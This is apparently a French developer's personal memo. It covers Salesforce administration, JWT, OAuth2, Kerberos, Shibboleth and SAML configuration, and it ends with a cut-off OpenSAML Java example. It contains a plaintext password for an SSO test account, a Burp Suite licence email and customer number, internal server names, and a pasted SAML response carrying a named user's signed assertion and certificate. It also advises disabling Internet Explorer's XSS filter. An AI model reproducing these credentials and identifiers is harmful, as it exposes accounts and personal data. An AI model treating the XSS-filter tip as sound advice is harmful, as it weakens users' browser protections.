        creer objets dans ordre 26|26
        soql  22;53|41
        reporting 23|...
        vue d'ensemble diagrame diagramme graphique Avec schema builder 28|...
        lookup filter limiter Les values Des selects De parents ...|12
        creer Une custom app 33|14
        tabs d'appli 34|14
        page layout se definit dans Mon objet sous "page layout related ?" 36;45;69;94;70|39;40;87;102
        historique d un champ 12|17;1
        licences 12;9;7;58|...
        environnements 12;9;7;58|...
        owner 76;14;74;77
        changer owner En masse 165|96
        si 1obj e prive supperieur hierarchy peut qd meme Le voir
        objets 18|...
        (ty De fields) on peu calculer Les moyennes Des champs fils par ex>>>
        formula 47;17;48;49|30 exemple :   {!IF (recipient.owner.account.RecordType.Name=='Network Site Account',recipient.Account.Name,'')}
                  pour concatener  : recipient.Owner.FirstName&' '&recipient.Owner.LastName, (utiliser &)
        <<<
        formula vers parents ...|27;28
        autonumber 17|...
        field tracking notification si valr d1champ d'1obj change, chatter 45;193|18;102
        quick action raccourcis pour creer Des lignes Dans jointures 41;43|21;22
        globalquick action raccourcis pour creer lignes ...|23
        workflow s execute qd on appuye Sur btn save 119;120;124;125;158
        workflow ameliore : process=lightning process builder 123;124;125;158|70
        approval process 128;129;130;132;142
        faire varier approvers dynamiquement 135;136;137;138|...
        demande d approbation automatic 123;124
        tester webservices 165|...
        wsdl webservices 133|...
        ourbounds messaging 134|...
        portee apex 4|...
        id salesforce Des records 164|...
        type variable apex 137;165;191|...
        trigger apex 139|...
        trigger 54;119|...
        (champs,objets)>>>
        profile enleve droits  56;58;59;60;61;62,66;95|31;32;36
            possible voir via menu profil les RecordType auxquel il a droit dans section Record Type Settings
        permissions donne droits (ecrase profils) 62,63,64,89
        permission set 65|33;34
        field level security 66,96|36,5
        profil>permission>field level security
        <<<<<
        (records)>>>
        owd organization wid default 59,74,78,79,93,96,82|43;49
        roles 80;81|44
        manual sharing 85;86;89|46
        sharing rules 86|47
        apex sharing reason 87|48
        <<<
        code apex ...|108
        visual worker googleforms 144;146;149|84;88;92
        historique De nos actions 153;157|93;95
        changer setting UI 62
        record type 13,68,95|37;38;41;102
        queue 77|42
        group 83|45
       *** language De formule 101;102;103|53;54;55;56;67
                        validtions rules formule formula : 
                        AND(OR(Appreciated_points__c!='',Non_appreciated_points__c!='',Tested_elements__c!='',Non_tested_elements__c!=''), 
                      IF( // pour comparer la date d'un event 
                      IsAllDayEvent, 
                      ActivityDate + (DurationInMinutes / 1440) >= TODAY(), 
                      ActivityDateTime + (DurationInMinutes / 1440) >= Now() 
                      ) 
                      )           
        log&debug 105;106;107;108|...
        validation 110|57;60;63 // attention chez Renault mettre systematiquement  NOT($User.BypassVR__c) aux validation rule ; validations rules (idem pour les triggers)
        export import data insert update upsert 161;162;163;166;167;169;170;171;172;176;177;191|97;98;100;101
        visualforce 179;196;180;181;182;84;185;186;187;188;189;190|103;104:105;108
            Charger une page visual force integree : exemple d'url : https://c.cs17.visual.force.com/apex/LMT_LeadApproachAccs?id=066b0000001Hawm
        (standard) controllers 190
        
        
        bouton "where is this used?" très pratique pour ???        
        
      bonnes pratiques :
      pour interroger les Custom Settings: plutot que de faire des requetes, faire getAllValues ou getInstance.
      00. Merci à tous de systematiquement decocher l’ajout des champs crees aux layouts existants. Les layouts ne doivent être modifies que si une demande a ete faite dans ce sens
      0. Tous les objets crees dans Salesforce – champs, workflows, règles de validation, …etc, …etc. doivent avoir une description comportant principalement le nom du projet.  
          Les Account sont modifies par trigger pour ecraser purement et simplement le pays par celui du createur ou du modificateur. 
          Je n’y peux rien c’est comme ça (…).
          De plus, il n’est pas possible de bypasser les trigger simplement dans les classes de test 
          (et de toute façon cela n’aurait pas de sens).
          De ce fait, il ne faut ni creer ni modifier de compte directement dans les classes de test
          autrement dit, pas de update acc ni de create acc.

          4.	Les requêtes SOQL sans filtre
                A ne jamais faire ni dans Force.com ni ailleurs. Une requête à une base de donnees doit toujours être filtree 
                pour ne pas ramener « toute la base ». Ces erreurs sont pernicieuses car le traitement semble fonctionner 
                sur les environnement de test/recette avec un petit volume de donnees mais plante inevitablement en production 
                où les volumetries sont plus importantes.
                Exemples à eviter : 
                List<User> listUser = [Select Id, AccountId from User where Profile.UserLicense.Name = 'Partner Community']; 
                List<AccountTeamMember> listAccountTeamMember = [Select Id,UserId, AccountId from AccountTeamMember 
                where TeamMemberRole in :listRoleTeamMember]; 
                 
          5.	Les erreurs dans les layouts
                En tant que developpeurs nous savons bien que ces erreurs ne sont pas graves – ça ne fait pas planter l’appli.
                Malheureusement, le client, lui, ne le sait pas et nous loggue des anomalies critiques systematiquement ;-). 
                Trois cas symptomatiques :
                a.	Le champ manquant dans un layout
                b.	Le champ en trop dans un layout
                c.	La traduction qui manque
                Ces trois problèmes prennent leur origine dans la creation du champ.
                a.	Dans la page 3 lors de la creation d’un nouveau champ vous selectionnez les profils qui ont la visibilite sur ce champ.
                Si vous ne savez pas, cochez tous les profils LMTSFA et decocher les autres (à part System Administrator)
                b.	Dans la page 4 lors de la creation d’un champ vous selectionnez les layouts sur lesquels apparaissent le nouveau champ.
                En general decochez tout car même si vous devez mettre le champ dans l’un des layout,
                le fait de cocher ici place le champ dans la première section du layout et vous serez de toute manière amene
                à rouvrir le layout pour le modifier. Malheureusement, tous les layouts sont coches par defaut, il faut donc être vigilant.
                c.	L’erreur la plus frequente et qui genère un nombre important de defauts critiques.
                Faire des tests avec le users community qui sont pour la plupart en langue française
                et prendre le temps de verifier les layouts.
    pour faire des batchs pour du traitement en masse : 
    
    Sous internet explorer, pour ne pas avoir de problème avec le preview des HTML (using letterhead) templates email voici ce qu’il faut faire : 
        Aller sur 
        IE > Option internet > onglet Securite > Choisir le dessin « Internet » > Personnaliser le niveau > trouver script->Activer le filtre XSS > DESACTIVER

Enleve expres car deplace
JWT :  
    voir https://jwt.io/ a gauche c'est juste ce qu'il ya a droite en base64. Je peux m'amuser a changer le secret ça change la signature
    le tooken n'est pas sensé etre stocké dans les cookies ou dans le localstorage du browser.
    stateless: pas besoin de session ni de base de donnée avec l'utilisateur dedans. Le token suffit a valider que je suis Laurent !=cookie de session ou le serveur conserve une table des sessions.
    bonne pratique: ajouter dans le payload sub:9830984,exp:0938098Z: subscribe et expire date shortlife: duree de vie courte.: du coup necesite background authentication a chaque requette: pour ça utiliser librairies.
                        toujour mettre aud: = audience = pour quel service/serveur uniquement sert ce token?
                        toujours utiliser secret!= ou cle publique != par service/serveur
                        toujours refuser les token avec algo:null. il faut qu'il y ait un algo. UN ALGO ET UN SEUL
     archi: [1Client(Mon Browser)]<----1-------->[1Authentificationservice pour tous: il a 1 clé privée differente pour chaque RessourceService a qui il donne la cle publique correspondante.]
                                   \___2_______>[xRessourcesServices: chacune a une clé publique.] 
    algoritmes recommandés : ES256(cle publique pour verifier et cle privee pour signer mais plus rapide que RS256)  puis RS256(cle publique pour verifier et cle privee pour signer) puis HS256(ce n'est que un secret=chaine de caractère a garder privée. Attention danger avec ça car dans ce cas le client pourra hacker: Client    Service1JWTOuJeSuisAdmin,    Service2JWTOuJeNeSUisPasAdmin)
OAuth : OAuth2 : (oltu : https://cwiki.apache.org/confluence/display/OLTU/OAuth+2.0+Client+Quickstart et https://github.com/apache/oltu)
    USER = RessourceOwner = homme = 
    EDSN = Client = l'application qui demande une autorisation pour faire une action dans le ResourceServer.
    FID = AuthenticationServer=authorization server: accepte de donner le ticket
    FIDx = ResourceServer(API contenant les resources)
    En amont: 
    créer un abonnement
    FID transmet à EDSN: -id applicatif = client_id
    FID transmet à EDSN: -client_secret = secret_key = ne doit pas passer par le frontchannel
    FID transmet à EDSN: -url de la fid de dev,recette,prod
    EDSN transmet à FID: -nomapplication
    EDSN transmet à FID: -champs à récupérer
    EDSN transmet à FID: -scope // droits necessaires
    ImplicitMode: ne passe que par le frontchanell: on bypasse la partie "ask code"-"recieve code": on obtien direct l'accessToken
    Run:
      USER va sur EDSN
      (facultatif)EDSN presente un bouton pour rediriger vers FID. Si clique 
      EDSN redirige vers FID(facebook par ex) ; // FID et FIDx pourraient être une seule app.
                Requete http frontchannel:
                .setResponseType(ResponseType.CODE.toString()) ou Token(SiJeVeuxFaireDel'ImplicitMode) ou Token_ID(SiJeVeuxFaireDeL'OpenIdConnectEnImplicitMode)
                .setRedirectURI(oauthParams.getRedirectUri())=url de retour vers EDSN
                .setScope(oauthParams.getScope()=cequejeveuxfaire=monprofile(espace)listecontacts x y openid(sijeveuxUtiliserOAuthPourM'authentifier)
                .setClientId(oauthParams.getClientId())  
                .authorizationLocation(oauthParams.getAuthzEndpoint())
                .setState(oauthParams.getState())
                .buildQueryMessage();
                return new ModelAndView(new RedirectView(request.getLocationUri()));
                                -------------------------------------frontchannel---------------------->>>>>>>FID présente le prompt d'authentification. USER s'authentifie
                                                                                                              FID présente le consent Screen/scope. USER approuve
                                <<<<<<<<<<<<<<<<<<<<<<---------------frontchannel-----------------------------FID retourne AuthorizationCode=code=AuthorizationGrant(Dans les en-tête http.)                
                                                                    url = redirectURI = callback                        
    
    EDSN renvoit l’AuthorisationCode + idApplicatif + client_secret à FID--------backchannel------------>>>>>
                                     + GrantType=Authorization_code
 OU BIEN 
    EDSN envoit ResponseType=Token ou =Token_ID ---------------------------------frontchannel------------>>>>>
    1ere étape!ImplicitMode                                                                                             
                                                                                                              FID vérifie que code n'est pas l'AuthorisationCode n'a pas été hacké grâce à client_secret
                                              <<<<<<<<<<<<<<<<<<-----backchannel/frontSiImplicitMode--------- FID renvoit l’AccessToken      +           Token_ID si OpenID =JWT (AuthenticationServer doit supporter)
                                                                                                                          expiration=xms     +TokenType=bearer
    EDSN peut utiliser Token_ID:utilisateur est authentifié.
    EDSN demande une authorisation                                                                                                              
                   --->GET                                                                                           
                   --->GET  plusieurs fois tant que expir OK.
                   --->GET----------backchannel/frontSiImplicitMode-----renvoit l'AccessToken----------->>>>>>FIDx Vérifie que l'AccessToken est valide Puis Execute l'action ou                                                                                            
                                                                         contient le scope                                                                                     |
                                                                           OU renvoit                                                                                          |
                                                                         getUserInfo si a reçu l'Token_ID                                                                      |
                                                                                                                                                                               |
                          <<<<<<<<<<<<<<<<<<<<---------------------info demandée(restreinte au scope) backchannel---------------------------------------------------------------------retourne------FID renvoit un RefreshToken à EDSN

Kerberos : 
    utilisation de d'apache mod_auth_kerb : 
                    L'authentification kerberos est en place pour l'environnement hr9for.
                Pour les curieux voici la procedure de mise en place :
                
                - Installation des paquets red hat suivants : samba-common-tools,
                  mod_auth_kerb
                - Mise en place de fichiers de conf appropries :
                  /etc/krb5.conf
                  /etc/samba/smb.conf
                - Creation du compte ordinateur dans l'AD et du fichier keytab :
                  net ads join -U CompteAdminAD
                  net ads keytab create -U CompteAdminAD
                  net ads keytab add HTTP -U CompteAdminAD
                - chmod 644/etc/krb5.keytab # pour que apache puisse lire le fichier
                - config apache
                  <Location />
                	AuthType Kerberos
                	KrbAuthRealms ANGERS.FR
                	KrbServiceName HTTP
                	Krb5Keytab /etc/krb5.keytab
                	KrbMethodNegotiate on
                	KrbMethodK5Passwd on
                	KrbLocalUserMapping on
                	Require valid-user
                  </Location>
                - config tomcat : /srv/hr9for/tomcat/conf/server.xml
                  ajout du paramètre tomcatAuthentication="false"
                  dans la config du connecteur AJP
                
                On redemarre tomcat et apache et normalement cela fonctionne.
                L'utilisateur apparaît dans les logs apache, et on le recupère correctement dans tomcat :
                <% out.println( request.getRemoteUser() ); %> https://hr9for.angers.fr/hra-space/luc.jsp
                
shibboleth :
    installé sur C:\Program Files (x86)\Shibboleth pour le serveur et sur D:\Dev\Shibboleth pour l'application
    demarrer avec C:\Program Files (x86)\Shibboleth\ProcRun\shibd_idpw.exe
    url: http://localhost/idp/shibboleth
    ou ? https://idp.exemple.org/idp/shibboleth
BYOD :
    telephone mobile se connecte (avec un certificat) sur l'IDP ---> redirection avec requete saml vers SP
outils :de gestion programme de mot de password :
  keepass
    
SAML :   A LIRE: https://research.aurainfosec.io/bypassing-saml20-SSO/
          doc standard oasis http://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf
        burp : https://portswigger.net/users(burpsuite_pro_windows-x64_v1_7_33.exe)
              Email address:	laurent.duverge@soprahr.com
              Customer number:	B5FE1FA58B96A6E19639AC362EA9FD88

    superbes outils : https://www.samltool.com/online_tools.php (onelogin) 
    exemples d'assertions saml : https://www.samltool.com/generic_sso_res.php
    pour decoder encoder une requete saml:(base64) online
    SAMLResponse=PHNhbWxwOlJlc3BvbnNlIElEPSJfM2NiNzg3YTItNTg0Mi00OTdiLWEwZmQtNDNlZWFjNWNlYjMyIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAxNy0wOS0xOFQwOToyODowMi44NDFaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9xYS1hcHByZW50aXMtYXV0ZXVpbC5zb3ByYWhyb25saW5lLmNvbS9ocmEtc3BhY2Uvc2FtbC1sYW5kaW5nIiBDb25zZW50PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y29uc2VudDp1bnNwZWNpZmllZCIgSW5SZXNwb25zZVRvPSJhZmI4NDA4ZGQ5ZGdjMWE0YjVoOWg0YmppNmIyaWkiIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiPjxJc3N1ZXIgeG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPmh0dHA6Ly9qYXVuZS5hcHByZW50aXMtYXV0ZXVpbC5vcmcvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIgLz48L3NhbWxwOlN0YXR1cz48QXNzZXJ0aW9uIElEPSJfYThiNTA2M2EtZTBhNi00YWFlLWE0MGItZTRlZDY4MmZjZGZjIiBJc3N1ZUluc3RhbnQ9IjIwMTctMDktMThUMDk6Mjg6MDIuODQxWiIgVmVyc2lvbj0iMi4wIiB4bWxucz0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BPElzc3Vlcj5odHRwOi8vamF1bmUuYXBwcmVudGlzLWF1dGV1aWwub3JnL2FkZnMvc2VydmljZXMvdHJ1c3Q8L0lzc3Vlcj48ZHM6U2lnbmF0dXJlIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj48ZHM6U2lnbmVkSW5mbz48ZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIgLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIgLz48ZHM6UmVmZXJlbmNlIFVSST0iI19hOGI1MDYzYS1lMGE2LTRhYWUtYTQwYi1lNGVkNjgyZmNkZmMiPjxkczpUcmFuc2Zvcm1zPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjZW52ZWxvcGVkLXNpZ25hdHVyZSIgLz48ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIiAvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2IiAvPjxkczpEaWdlc3RWYWx1ZT55eUxoM09LZHBZNGZJWU9ySGxuSGFjTEg4MjA4K0E0cjVDS2N2MzAwbDdVPTwvZHM6RGlnZXN0VmFsdWU%2BPC9kczpSZWZlcmVuY2U%2BPC9kczpTaWduZWRJbmZvPjxkczpTaWduYXR1cmVWYWx1ZT5LNjcxekJEeUNkNElQZEVKM2g3NXdBK0hoTDY2ZkxaUDZCaGYxVU5YWHVYTkFHcWRGSm10YlUyVTNtQzBGRlVVNkJCR0hPU1Voa1lla3pHdDJGdVZodHErZVd4SWZoUzVZSkRGS0lBdGFNU3c4Zk45a1dTQnltK3I0bzFqRm9wd0NKeHlVRmtUMFhINHo3UEJVcHZDRFhWZlRlSXU4UmlNdWkyYUxHSEZkODhIRHZ6TDBwOU1LWVh0MmpkZFN1YWtNUERoK2tXNFpQU0hzUUQxUTVRMndVdUpIZ3ZqSGRFN1BzTWlnNmFEUHZOQU5XbjM2aHg2YVc3UkQ0WGRJa2thR0hTMWRUbm5PeUNydEpadWtGeXJVeC9pclk4L1ZDbTF4R0s3RTBqZThEdTRhSVE4WVBkK3VQQ0Jjd0tjRzE2Q1RhNi8rN0lLRGdjS3kzVE54ZjlWUWc9PTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPEtleUluZm8geG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpYNTA5RGF0YT48ZHM6WDUwOUNlcnRpZmljYXRlPk1JSUM4akNDQWRxZ0F3SUJBZ0lRUW5Sa2l2WW5nN3RDZUdRdTNWODRXREFOQmdrcWhraUc5dzBCQVFzRkFEQTFNVE13TVFZRFZRUURFeXBCUkVaVElGTnBaMjVwYm1jZ0xTQnFZWFZ1WlM1aGNIQnlaVzUwYVhNdFlYVjBaWFZwYkM1dmNtY3dIaGNOTVRjd09UQXhNREl3TVRFNFdoY05NVGd3T1RBeE1ESXdNVEU0V2pBMU1UTXdNUVlEVlFRREV5cEJSRVpUSUZOcFoyNXBibWNnTFNCcVlYVnVaUzVoY0hCeVpXNTBhWE10WVhWMFpYVnBiQzV2Y21jd2dnRWlNQTBHQ1NxR1NJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUNpTVNjZ2o0NGI2ZWpEV0UreEtZSXFNWlYwOU1vMEdtcGxXQWtnTHpJWmRac0Z6cmhvUm9GUWI1MXMwNU83QmJOVG0zTitsakprSy84NzZ1USttR2R0N3doMFVvTllSazRmZFB0QWpva2RBcFhCM3E1RUhVRi8wbzZ1RzhtV1pCc0E0WlllcUpOQkpVaDYvR1U5MXVGaVVqS3l5eDhkUWdENm5CeVZWamtWeGtOYWVocDhob0pnNFNpL3pVWnYzKzk2blhnUGJxTmRGU1NsVk9Kczk4WkJGNW1lNlVBZ3ltMFRBWUdVcy95TnhzamxkUUx6dWdFdExhUEp5b3c5bndQWXRrNzRRZHZybHpQSWNXYmJrYW1lYUhDWndUbnRmOVZsZkNGcUtSUjV5S2RUN2p0VnJ0dmZCNHFJOEtZV0lPcENxVEM5ODdqVzFhdE5ERmE3Y2NhVEFnTUJBQUV3RFFZSktvWklodmNOQVFFTEJRQURnZ0VCQUJqNjEwMVAzdnN1ZlBEVHYxNW9VcTduc3ZIbjRDUnJtSnBrOTZZYjIrSEJYN2VZakFReXkyRkhNSWdHQTNMZXhVaVlFWVdVeGcyY2VBSlV2OFZBZmN5U3ZEZ0xFS0JDM3I2aXJWSXppVlk5b1JSRGI4VUdRSHlkaE0xbElEbWYzMzlacHB2VFBnd1hiOEgzbk45Q2dQWHdWMmhaenRHRkNKRGdWcXBNbytWcVZ3V1liMDUxMXRzVVNldHp2RTJNR2JLdTVDaGZFVEFCaGJIS1ZLQi9wd1M4MWxZeHZtTFhCTmpxVTlDYld4amlhaWJhU0oyVk5IdEpFYjFQTlJJUUViMEhZMkgrUFhqU0ppaXY1aDZiMDk5cjRRNkFLV2ZCMkliVVZZYkVOUUFqdTU4cFVRdDFoZzdUKy9YaWZ1NFp2WWMyNWNMa3lTZmZUb2N2SFh5Q1pXQT08L2RzOlg1MDlDZXJ0aWZpY2F0ZT48L2RzOlg1MDlEYXRhPjwvS2V5SW5mbz48L2RzOlNpZ25hdHVyZT48U3ViamVjdD48TmFtZUlEPmhlcnZlLmNoZXJlbDwvTmFtZUlEPjxTdWJqZWN0Q29uZmlybWF0aW9u
1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI%2BPFN1YmplY3RDb25maXJtYXRpb25EYXRhIEluUmVzcG9uc2VUbz0iYWZiODQwOGRkOWRnYzFhNGI1aDloNGJqaTZiMmlpIiBOb3RPbk9yQWZ0ZXI9IjIwMTctMDktMThUMDk6MzM6MDIuODQxWiIgUmVjaXBpZW50PSJodHRwczovL3FhLWFwcHJlbnRpcy1hdXRldWlsLnNvcHJhaHJvbmxpbmUuY29tL2hyYS1zcGFjZS9zYW1sLWxhbmRpbmciIC8%2BPC9TdWJqZWN0Q29uZmlybWF0aW9uPjwvU3ViamVjdD48Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMTctMDktMThUMDk6Mjg6MDIuODQxWiIgTm90T25PckFmdGVyPSIyMDE3LTA5LTE4VDEwOjI4OjAyLjg0MVoiPjxBdWRpZW5jZVJlc3RyaWN0aW9uPjxBdWRpZW5jZT5IUkFTLVNQLVFBPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9Db25kaXRpb25zPjxBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMTctMDktMThUMDk6MjI6MjEuMTY3WiIgU2Vzc2lvbkluZGV4PSJfYThiNTA2M2EtZTBhNi00YWFlLWE0MGItZTRlZDY4MmZjZGZjIj48QXV0aG5Db250ZXh0PjxBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY%2BPC9BdXRobkNvbnRleHQ%2BPC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D 
          https://www.ssocircle.com/en/1203/saml-request-online-decoder-encoder/
          moncompte: laurentDuverge/47469cm42àç"'_(581sDf6
          aller sur https://idp.ssocircle.com/sso/toolbox/samlDecode.jsp
          Encore mieux utiliser plugin saml de firefox : menu firefox>Saml tracker
    pour installer un SP avec Apache:
            lire doc https://github.com/UNINETT/mod_auth_mellon 
                      ProxyPass /edsn http://vcosirh-3.vinci-concessions.net:8182/edsn voir LINKpppassorder
                      ProxyPassReverse /esdn http://localhost:8182/edsn
                      <Location /edsn>
                      #        MellonEnable "off"
                      #        # configuration saml
                              MellonSPPrivateKeyFile /etc/ssl/private/http_solisdev.vinci_concessions.net_edsn.key
                              MellonSPCertFile /etc/ssl/certs/http_solisdev.vinci_concessions.net_edsn.cert
                              MellonSPMetadataFile /etc/httpd/http_solisdev.vinci_concessions.net_edsn.xml
                      
                              MellonEndpointPath /mellon
                              MellonSessionDump on
                              MellonSamlResponseDump on
                              MellonSecureCookie On
                              MellonIdpMetadataFile   /etc/httpd/authentic-metadata.xml
                              MellonEnable "auth"
                              RequestHeader unset SAML_ID // il retire du header l'attribut SAML_ID qui pourrait exister dans la requete qui entre
                              RequestHeader set SAML_ID "%{MELLON_VINCIID}e" // et il ajoute dans la requete le header SAML_ID avec la valeur trouvée dans l'assertion SAML
                              ou 
                              RequestHeader set SAML_USER "%{MELLON_NAME_ID}e" env=MELLON_NAME_ID

                      </Location>

    msisdn=mon numero de tel international
      Exemple pour creer une assertion SAML côte IDP : (il utilise opensaml2 alors que maintenant c 3 ca change unpeu)
                                  import java.util.HashMap;
                                  import java.util.Map;
                                  import java.util.Set;
                                   
                                  import org.joda.time.DateTime;
                                  import org.opensaml.Configuration;
                                  import org.opensaml.DefaultBootstrap;
                                  import org.opensaml.common.SAMLObjectBuilder;
                                  import org.opensaml.common.SAMLVersion;
                                  import org.opensaml.saml2.core.Assertion;
                                  import org.opensaml.saml2.core.Attribute;
                                  import org.opensaml.saml2.core.AttributeStatement;
                                  import org.opensaml.saml2.core.AttributeValue;
                                  import org.opensaml.saml2.core.AuthnContext;
                                  import org.opensaml.saml2.core.AuthnContextClassRef;
                                  import org.opensaml.saml2.core.AuthnStatement;
                                  import org.opensaml.saml2.core.Condition;
                                  import org.opensaml.saml2.core.Conditions;
                                  import org.opensaml.saml2.core.Issuer;
                                  import org.opensaml.saml2.core.NameID;
                                  import org.opensaml.saml2.core.OneTimeUse;
                                  import org.opensaml.saml2.core.Subject;
                                  import org.opensaml.saml2.core.SubjectConfirmation;
                                  import org.opensaml.saml2.core.SubjectConfirmationData;
                                  import org.opensaml.saml2.core.impl.AssertionMarshaller;
                                  import org.opensaml.xml.ConfigurationException;
                                  import org.opensaml.xml.XMLObjectBuilder;
                                  import org.opensaml.xml.XMLObjectBuilderFactory;
                                  import org.opensaml.xml.io.MarshallingException;
                                  import org.opensaml.xml.schema.XSString;
                                  import org.opensaml.xml.util.XMLHelper;
                                  import org.w3c.dom.Element;
                                   
                                  /**
                                   * This is a demo class which creates a valid SAML 2.0 Assertion.
                                   */
                                  public class SAMLWriter
                                  {
                                   
                                  	public static void main(String[] args) {
                                      	try {
                                  			SAMLInputContainer input = new SAMLInputContainer();
                                  			input.strIssuer = "http://synesty.com";
                                  			input.strNameID = "UserJohnSmith";
                                  			input.strNameQualifier = "My Website";
                                  			input.sessionId = "abcdedf1234567";
                                   
                                  			Map customAttributes = new HashMap();
                                  			customAttributes.put("FirstName", "John");
                                  			customAttributes.put("LastName", "Smith");
                                   
                                  			input.attributes = customAttributes;
                                   
                                  			Assertion assertion = SAMLWriter.buildDefaultAssertion(input);
                                  			AssertionMarshaller marshaller = new AssertionMarshaller();
                                  			Element plaintextElement = marshaller.marshall(assertion);
                                  			String originalAssertionString = XMLHelper.nodeToString(plaintextElement);
                                   
                                  			System.out.println("Assertion String: " + originalAssertionString);
                                   
                                  			// TODO: now you can also add encryption....
                                   
                                  		} catch (MarshallingException e) {
                                  			// TODO Auto-generated catch block
                                  			e.printStackTrace();
                                  		}
                                   
                                  	}
                                   
                                  	private static XMLObjectBuilderFactory builderFactory;
                                   
                                  	public static XMLObjectBuilderFactory getSAMLBuilder() throws ConfigurationException{
                                   
                                  		if(builderFactory == null){
                                  			// OpenSAML 2.3
                                  			 DefaultBootstrap.bootstrap();
                                  	         builderFactory = Configuration.getBuilderFactory();
                                  		}
                                   
                                  		return builderFactory;
                                  	}
                                   
                                  	/**
                                  	 * Builds a SAML Attribute of type String
                                  	 * @param name
                                  	 * @param value
                                  	 * @param builderFactory
                                  	 * @return
                                  	 * @throws ConfigurationException
                                  	 */
                                  	public static Attribute buildStringAttribute(String name, String value, XMLObjectBuilderFactory builderFactory) throws ConfigurationException
                                  	{
                                  		SAMLObjectBuilder attrBuilder = (SAMLObjectBuilder) getSAMLBuilder().getBuilder(Attribute.DEFAULT_ELEMENT_NAME);
                                  		 Attribute attrFirstName = (Attribute) attrBuilder.buildObject();
                                  		 attrFirstName.setName(name);
                                   
                                  		 // Set custom Attributes
                                  		 XMLObjectBuilder stringBuilder = getSAMLBuilder().getBuilder(XSString.TYPE_NAME);
                                  		 XSString attrValueFirstName = (XSString) stringBuilder.buildObject(AttributeValue.DEFAULT_ELEMENT_NAME, XSString.TYPE_NAME);
                                  		 attrValueFirstName.setValue(value);
                                   
                                  		 attrFirstName.getAttributeValues().add(attrValueFirstName);
                                  		return attrFirstName;
                                  	}
                                   
                                  	/**
                                  	 * Helper method which includes some basic SAML fields which are part of almost every SAML Assertion.
                                  	 *
                                  	 * @param input
                                  	 * @return
                                  	 */
                                  	public static Assertion buildDefaultAssertion(SAMLInputContainer input)
                                  	{
                                  		try
                                  		{
                                  	         // Create the NameIdentifier
                                  	         
                                  	        XMLObjectBuilderFactory builderFactory = Configuration.getBuilderFactory();
                                            SAMLObjectBuilder builder = (SAMLObjectBuilder)builderFactory.getBuilder(NameID.DEFAULT_ELEMENT_NAME);
                                            NameID nameId = (NameID) builder.buildObject();
                                  	         nameId.setValue(input.getStrNameID());
                                  	         nameId.setNameQualifier(input.getStrNameQualifier());
                                  	         nameId.setFormat(NameID.UNSPECIFIED);
                                   
                                  	         // Create the SubjectConfirmation
                                   
                                  	         SAMLObjectBuilder confirmationMethodBuilder = (SAMLObjectBuilder)  SAMLWriter.getSAMLBuilder().getBuilder(SubjectConfirmationData.DEFAULT_ELEMENT_NAME);
                                  	         SubjectConfirmationData confirmationMethod = (SubjectConfirmationData) confirmationMethodBuilder.buildObject();
                                  	         DateTime now = new DateTime();
                                  	         confirmationMethod.setNotBefore(now);
                                  	         confirmationMethod.setNotOnOrAfter(now.plusMinutes(2));
                                   
                                  	         SAMLObjectBuilder subjectConfirmationBuilder = (SAMLObjectBuilder) SAMLWriter.getSAMLBuilder().getBuilder(SubjectConfirmation.DEFAULT_ELEMENT_NAME);
                                  	         SubjectConfirmation subjectConfirmation = (SubjectConfirmation) subjectConfirmationBuilder.buildObject();
                                  	         subjectConfirmation.setSubjectConfirmationData(confirmationMethod);
                                   
                                  	         // Create the Subject
                                  	         SAMLObjectBuilder subjectBuilder = (SAMLObjectBuilder) SAMLWriter.getSAMLBuilder().getBuilder(Subject.DEFAULT_ELEMENT_NAME);
                                  	         Subject subject = (Subject) subjectBuilder.buildObject();
                                   
                                  	         subject.setNameID(nameId);
                                  	         subject.getSubjectConfirmations().add(subjectConfirmation);
                                   
                                  	         // Create Authentication Statement
                                  	         SAMLObjectBuilder authStatementBuilder = (SAMLObjectBuilder) SAMLWriter.getSAMLBuilder().getBuilder(AuthnStatement.DEFAULT_ELEMENT_NAME);
